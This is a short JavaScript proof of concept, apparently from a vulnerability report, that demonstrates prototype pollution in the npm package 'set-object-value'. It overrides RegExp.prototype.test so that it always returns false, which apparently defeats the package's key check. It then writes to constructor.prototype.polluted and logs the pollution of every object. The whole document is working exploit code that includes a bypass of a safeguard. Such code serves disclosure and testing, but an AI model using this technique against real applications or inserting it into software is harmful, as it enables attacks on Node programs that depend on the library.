RegExp.prototype.test = () => false;
var setObjectValue = require('set-object-value');
obj = {};
console.log({}.polluted);
setObjectValue(obj, [
    'constructor',
    'prototype',
    'polluted'
], 'yes');
console.log({}.polluted);